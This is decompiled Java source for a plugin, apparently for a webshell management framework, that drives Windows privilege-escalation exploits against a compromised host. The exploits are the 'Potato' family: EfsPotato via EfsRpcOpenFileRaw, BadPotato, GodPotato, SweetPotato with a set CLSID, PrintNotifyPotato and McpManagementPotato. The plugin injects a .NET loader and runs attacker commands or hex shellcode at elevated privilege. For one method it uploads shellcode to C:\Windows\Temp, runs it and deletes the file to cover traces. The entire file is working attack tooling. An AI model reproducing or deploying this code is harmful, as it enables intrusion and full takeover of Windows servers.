//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.plugins.csharp;

import core.annotation.PluginAnnotation;
import core.ui.component.dialog.GOptionPane;
import java.io.ByteArrayInputStream;
import java.io.InputStream;

import shells.plugins.PluginInfo;
import util.Log;
import util.functions;
import util.http.ReqParameter;

@PluginAnnotation(
        payloadName = "CSharpDynamicPayload",
        Name = "TH_TOOLS",
        DisplayName = "TH_TOOLS"
)
public class TH_TOOLS extends shells.plugins.generic.TH_TOOLS {
    public TH_TOOLS() {
    }





    public boolean load() {
        if (!this.loadState) {
            try {
                InputStream inputStream = this.getClass().getResourceAsStream("assets/AsmLoader.dll");
                byte[] data = functions.readInputStream(inputStream);
                inputStream.close();
                if (this.payload.include("AsmLoader.Run", data)) {
                    this.loadState = true;
                    GOptionPane.showMessageDialog(this.corePanel, "Load success", "提示", 1);
                } else {
                    GOptionPane.showMessageDialog(this.corePanel, "Load fail", "提示", 2);
                }
            } catch (Exception var3) {
                Log.error(var3);
                GOptionPane.showMessageDialog(this.corePanel, var3.getMessage(), "提示", 2);
            }
        }

        return this.loadState;
    }

    public String getClassName() {
        return "AsmLoader.Run";
    }

    public byte[] ExeCuteCmd() {
        PluginInfo pluginInfo = this.SearchPluginByName(this.CurrentPlugin);
        byte[] result;
        ReqParameter parameter;
        if (pluginInfo.getDisplayName().equals("EfsPotato")) {
            parameter = new ReqParameter();
            parameter.add("pipe", "lsarpc");
            parameter.add("exploitMethod", "EfsRpcOpenFileRaw");
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("readWait", Integer.toString(5000));
            result = this.payload.evalFunc(pluginInfo.getPluginName(), "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("BadPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            result = this.payload.evalFunc("BadPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("GodPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            result = this.payload.evalFunc("GodPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("SweetPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("clsid", "4991D34B-80A1-4291-83B6-3328366B9097");
            result = this.payload.evalFunc("SweetPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("PrintNotifyPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            result = this.payload.evalFunc("PrintNotifyPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("McpManagementPotato")) {
            try {
                result = this.runNetPe(functions.base64EncodeToString(this.Excute_cmd.getBytes()), this.getPluginByte(), 7000, this.textArea_CmdResult.getPrintStream());
                return result;
            } catch (Exception var4) {
                return var4.getMessage().getBytes();
            }
        } else {
            return null;
        }
    }

    public byte[] ExeCuteShellcode() {
        if (this.shellcodeHex == null || this.shellcodeHex.length() == 0 || this.shellcodeHex.equals("")) {
            this.shellcodeHex = this.TextArea_shellcode.getText().trim();
        }

        PluginInfo pluginInfo = this.SearchPluginByName(this.CurrentPlugin);
        ReqParameter parameter;
        byte[] result;
        if (pluginInfo.getDisplayName().equals("EfsPotato")) {
            parameter = new ReqParameter();
            parameter.add("pipe", "lsarpc");
            parameter.add("exploitMethod", "EfsRpcOpenFileRaw");
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("shellcode", functions.hexToByte(this.shellcodeHex));
            parameter.add("readWait", Integer.toString(0));
            result = this.payload.evalFunc("EfsPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("BadPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("shellcode", functions.hexToByte(this.shellcodeHex));
            result = this.payload.evalFunc("BadPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("GodPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("shellcode", functions.hexToByte(this.shellcodeHex));
            result = this.payload.evalFunc("GodPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("SweetPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("shellcode", functions.hexToByte(this.shellcodeHex));
            parameter.add("clsid", "4991D34B-80A1-4291-83B6-3328366B9097");
            result = this.payload.evalFunc("SweetPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("PrintNotifyPotato")) {
            parameter = new ReqParameter();
            parameter.add("cmd", this.Excute_cmd);
            parameter.add("shellcode", functions.hexToByte(this.shellcodeHex));
            result = this.payload.evalFunc("PrintNotifyPotato.Run", "run", parameter);
            return result;
        } else if (pluginInfo.getDisplayName().equals("McpManagementPotato")) {
            try {
                String shellcodeb64 = functions.base64EncodeToString(functions.hexToByte(this.shellcodeHex));
                String filename = functions.getRandomString(5) + ".bin";
                filename = "C:\\Windows\\Temp\\" + filename;
                if (!this.shellEntity.getFrame().getShellFileManager().uploadBigFile(filename, "bin", new ByteArrayInputStream(shellcodeb64.getBytes()))) {
                    GOptionPane.showMessageDialog(this.corePanel, "Shellcode上传失败!", "提示", 2);
                }

                String arg = functions.base64EncodeToString(this.Excute_cmd.getBytes()) + " " + functions.base64EncodeToString(filename.getBytes());
                result = this.runNetPe(arg, this.getPluginByte(), 3000, this.textArea_CmdResult.getPrintStream());
                this.payload.deleteFile(filename);
                return result;
            } catch (Exception var6) {
                return var6.getMessage().getBytes();
            }
        } else {
            return null;
        }
    }

    public boolean loadPlugin(String PluginName) {
        PluginInfo pluginInfos = this.SearchPluginByName(PluginName);
        Boolean PluginLoadState = pluginInfos.getLoadState();
        if (!PluginLoadState) {
            try {
                if (pluginInfos.getLoadType() == 1) {
                    byte[] binCode = this.getPluginByte();
                    PluginLoadState = this.payload.include(pluginInfos.getPluginName(), binCode);
                } else if (pluginInfos.getLoadType() == 2) {
                    PluginLoadState = true;
                }

                this.SetPluginLoadStateByName(PluginName, PluginLoadState);
            } catch (Exception var6) {
                Log.error(var6);
            }
        }

        return PluginLoadState;
    }

    protected PluginInfo[] InitPlugInfo() {
        PluginInfo[] pluginInfos = new PluginInfo[]{new PluginInfo("EfsPotato.Run", "EfsPotato", 1), new PluginInfo("BadPotato.Run", "BadPotato", 1), new PluginInfo("GodPotato.Run", "GodPotato", 1), new PluginInfo("SweetPotato.Run", "SweetPotato", 1), new PluginInfo("PrintNotifyPotato.Run", "PrintNotifyPotato", 1), new PluginInfo("McpManagementPotato.Run", "McpManagementPotato", 2)};
        return pluginInfos;
    }

    protected byte[] getPluginByte() {
        InputStream inputStream = this.getClass().getResourceAsStream(String.format("assets/TH_TOOLS/%s.dll", this.CurrentPlugin));
        return functions.readInputStreamAutoClose(inputStream);
    }
}
